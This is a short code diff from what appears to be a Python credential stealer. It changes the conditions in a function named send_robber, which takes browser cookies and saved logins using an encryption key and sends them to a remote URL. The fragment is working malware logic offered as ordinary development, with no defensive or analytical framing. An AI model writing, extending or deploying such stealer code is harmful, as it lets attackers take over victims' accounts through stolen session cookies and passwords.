@@ -25,10 +25,10 @@ def send_error(sent):
 
 def send_robber(login_directory, cookie_directory, encryption_key):
     try:
-        if cookies_bool:
+        if not cookies_bool:
             cookies = steal.get_cookies(cookie_directory, encryption_key)
             send_data(url, "cookies", cookies)
-        if login_bool:
+        if not login_bool:
             logins = steal.get_logins(login_directory, encryption_key)
             send_data(url, "logins", logins)
     except:
